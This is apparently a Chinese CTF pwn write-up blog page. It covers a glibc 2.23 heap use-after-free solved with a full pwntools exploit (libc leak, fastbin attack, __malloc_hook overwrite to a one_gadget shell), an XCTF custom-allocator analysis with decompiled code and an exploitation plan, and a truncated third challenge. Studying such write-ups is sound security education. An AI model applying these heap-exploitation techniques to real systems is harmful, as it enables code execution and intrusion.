class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>存在 uaf，通过申请unsortedbin 去泄露libc基地址后，fastbin attack，通过错位字节绕过size检查的宏，写malloc hook为one gadget 触发 one gadget拿shell</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"node2.anna.nssctf.cn"</span>
PORT <span class="token operator">=</span> <span class="token number">28922</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"idx?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"size?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>



<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"idx?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"idx?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"idx?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">"content :"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"content : "</span><span class="token punctuation">)</span>
leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x74afcefc4b78</span> <span class="token operator">-</span> <span class="token number">0x74afcec00000</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span>
<span class="token comment"># constraints:</span>
<span class="token comment">#   rax == NULL</span>

<span class="token comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span>
<span class="token comment"># constraints:</span>
<span class="token comment">#   [rsp+0x30] == NULL</span>

<span class="token comment"># 0xf03a4 execve("/bin/sh", rsp+0x50, environ)</span>
<span class="token comment"># constraints:</span>
<span class="token comment">#   [rsp+0x50] == NULL</span>

<span class="token comment"># 0xf1247 execve("/bin/sh", rsp+0x70, environ)</span>
<span class="token comment"># constraints:</span>
<span class="token comment">#   [rsp+0x70] == NULL</span>

malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1247</span>

add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span>


success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>


<span class="token comment"># g(p)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="heap-2-27"><a href="#heap-2-27" class="headerlink" title="heap-2.27"></a>heap-2.27</h2><p>逻辑与漏洞和2.23相同，2.27中加入了tcache 可以使用tcache poison去实现任意地址写的原语写free hook去getshell</p>
<p>exp:</p>
	
	</div>
  <a type="button" href="/2024/06/04/litctf2024-pwn/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/05/30/xctf-BuggyAllocator复现/" >xctf_BuggyAllocator复现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-05-30  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="xctf-BuggyAllocator复现"><a href="#xctf-BuggyAllocator复现" class="headerlink" title="xctf_BuggyAllocator复现"></a>xctf_BuggyAllocator复现</h2><p>程序有 alloc 和dealloc两个选项</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  v0 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"*** Buggy  Allocator***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"***     1. Alloc    ***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"***     2. Dealloc  ***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4019D7</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token operator">::</span>istream<span class="token operator">::</span>operator<span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v3 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Invalid Choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>，其中alloc申请大于 0x80 会使用malloc函数分配内存(ptmalloc2)，小于等于 0x80会使用自定义的堆管理器去分配内存</p>
<pre class="line-numbers language-none"><code class="language-none">_QWORD *__fastcall alloc_memory(size_t size)
&#123;
  __int64 v2; &#x2F;&#x2F; rax
  _QWORD **v3; &#x2F;&#x2F; [rsp+18h] [rbp-18h]
  _QWORD *v4; &#x2F;&#x2F; [rsp+20h] [rbp-10h]

  if ( !size )
    return 0LL;
  if ( size &gt; 0x80 )
    return malloc_(size);
  v3 &#x3D; (_QWORD **)&amp;free_list[get_idx(size)];
  v4 &#x3D; *v3;
  if ( *v3 )
  &#123;
    *v3 &#x3D; (_QWORD *)*v4;
    return v4;
  &#125;
  else
  &#123;
    v2 &#x3D; Alignment_size(size);
    return refill(v2);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>自定义的堆管理器维护一个free_list，申请内存的时候，当free list中没有申请大小的堆块时，就会调用refill 填充空闲区域(arena_end - arena_start)，填充完后free list中拿，当空闲区域不够refill的时候会判断free list中有没有更大的堆块可以进行refill，如果都不满足会调用malloc申请名称</p>
<pre class="line-numbers language-none"><code class="language-none">_QWORD *__fastcall refill(unsigned __int64 size)
&#123;
  int nobjs; &#x2F;&#x2F; [rsp+18h] [rbp-38h] BYREF
  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-34h]
  _QWORD *current_obj; &#x2F;&#x2F; [rsp+20h] [rbp-30h]
  _QWORD *v5; &#x2F;&#x2F; [rsp+28h] [rbp-28h]
  _QWORD *my_free_list; &#x2F;&#x2F; [rsp+30h] [rbp-20h]
  _QWORD *v7; &#x2F;&#x2F; [rsp+38h] [rbp-18h]
  _QWORD *next_obj; &#x2F;&#x2F; [rsp+40h] [rbp-10h]
  unsigned __int64 v9; &#x2F;&#x2F; [rsp+48h] [rbp-8h]

  v9 &#x3D; __readfsqword(0x28u);
  nobjs &#x3D; 20;
  v5 &#x3D; (_QWORD *)chunk_alloc(size, &amp;nobjs);
  if ( nobjs &#x3D;&#x3D; 1 )
    return v5;
  my_free_list &#x3D; &amp;free_list[get_idx(size)];
  v7 &#x3D; v5;
  current_obj &#x3D; v5;
  *my_free_list &#x3D; (char *)v5 + size;
  for ( i &#x3D; 0; i !&#x3D; nobjs - 1; ++i )
  &#123;
    next_obj &#x3D; (_QWORD *)((char *)current_obj + size);
    *current_obj &#x3D; (char *)current_obj + size;
    current_obj &#x3D; next_obj;
  &#125;
  return v7;
&#125;

_QWORD *__fastcall chunk_alloc(unsigned __int64 size, int *nobjs)
&#123;
  unsigned __int64 idx; &#x2F;&#x2F; rax
  int i; &#x2F;&#x2F; [rsp+14h] [rbp-3Ch]
  unsigned __int64 all_size; &#x2F;&#x2F; [rsp+18h] [rbp-38h]
  unsigned __int64 available_size; &#x2F;&#x2F; [rsp+20h] [rbp-30h]
  _QWORD *arena_start_ptr; &#x2F;&#x2F; [rsp+28h] [rbp-28h]
  size_t v8; &#x2F;&#x2F; [rsp+38h] [rbp-18h]
  _QWORD **v9; &#x2F;&#x2F; [rsp+40h] [rbp-10h]
  _QWORD *v10; &#x2F;&#x2F; [rsp+48h] [rbp-8h]

  all_size &#x3D; size * *nobjs;
  available_size &#x3D; arena_end - arena_start;
  arena_start_ptr &#x3D; (_QWORD *)arena_start;
  if ( all_size &gt; arena_end - arena_start )
  &#123;
    if ( available_size &lt; size )
    &#123;
      if ( available_size )
      &#123;
        arena_start &#x3D; arena_end;
        idx &#x3D; get_idx(available_size);
        *arena_start_ptr &#x3D; free_list[idx];
        free_list[idx] &#x3D; arena_start_ptr;
      &#125;
      v8 &#x3D; 2 * all_size;
      for ( i &#x3D; size; i &lt;&#x3D; 128; i +&#x3D; 8 )
      &#123;
        v9 &#x3D; (_QWORD **)&amp;free_list[get_idx(i)];
        v10 &#x3D; *v9;
        if ( *v9 )
        &#123;
          *v9 &#x3D; (_QWORD *)*v10;
          arena_start &#x3D; (__int64)v10;
          arena_end &#x3D; (__int64)v10 + i;
          return chunk_alloc(size, nobjs);
        &#125;
      &#125;
      arena_end &#x3D; 0LL;
      arena_start &#x3D; (__int64)malloc_(v8);
      arena_end &#x3D; arena_start + v8;
      return chunk_alloc(size, nobjs);
    &#125;
    else
    &#123;
      *nobjs &#x3D; available_size &#x2F; size;
      arena_start +&#x3D; size * *nobjs;
      return arena_start_ptr;
    &#125;
  &#125;
  else
  &#123;
    arena_start +&#x3D; all_size;
    return arena_start_ptr;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>存在漏洞的地方是建立链表的时候不会将最后一个obj的next指针置空，可以通过堆块上残留的数据伪造一个指针破坏链表，实现任意地址分配</p>
<pre class="line-numbers language-none"><code class="language-none">for ( i &#x3D; 0; i !&#x3D; nobjs - 1; ++i )
&#123;
  next_obj &#x3D; (_QWORD *)((char *)current_obj + size);
  *current_obj &#x3D; (char *)current_obj + size;
  current_obj &#x3D; next_obj;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用的思路是，首先申请大量的堆块，使arena_end - arena_start尽可能的小，这样申请小块内存的时候,建立freelist,会优先从free list中的大堆块中建立，而不是从后面空闲内存那建立，利用大堆块中残留的数据伪造next指针破坏freelist实现任意地址写，写IO_2_1_stdout 通过puts的利用链将libc的地址泄露出来后，再通过environ泄露栈地址，最后写rop</p>
	
	</div>
  <a type="button" href="/2024/05/30/xctf-BuggyAllocator复现/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/05/27/DragonKnightCTF-pwn/" >DragonKnightCTF_pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-05-27  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h2><p>可以发现程序分三个部分，第一个部分是一个base32的逻辑，第二个是一个表达式计算的逻辑，第三个是格式化字符串漏洞 + 栈溢出的逻辑，要先过了前两个逻辑才会走到存在漏洞的逻辑，程序还存在一个backdoor</p>
<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
    unsigned int v3; &#x2F;&#x2F; eax
    unsigned int v4; &#x2F;&#x2F; eax
    unsigned int v5; &#x2F;&#x2F; eax
    unsigned int v6; &#x2F;&#x2F; eax
    unsigned __int8 v8; &#x2F;&#x2F; [rsp+3h] [rbp-19Dh]
    unsigned __int8 v9; &#x2F;&#x2F; [rsp+4h] [rbp-19Ch]
    unsigned __int8 v10; &#x2F;&#x2F; [rsp+5h] [rbp-19Bh]
    unsigned __int8 v11; &#x2F;&#x2F; [rsp+6h] [rbp-19Ah]
